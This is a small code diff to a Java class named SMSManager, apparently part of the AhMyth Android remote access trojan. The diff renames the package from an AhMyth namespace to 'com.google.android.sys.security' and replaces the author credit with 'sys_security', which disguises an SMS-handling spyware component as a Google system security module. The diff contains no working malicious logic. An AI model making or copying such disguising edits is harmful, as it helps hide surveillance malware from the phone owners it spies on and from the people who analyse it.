@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.database.Cursor;
 import android.net.Uri;
@@ -10,7 +10,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 /**
- * Created by AhMyth on 11/10/16.
+ * Created by sys_security on 11/10/16.
  */
 
 public class SMSManager {
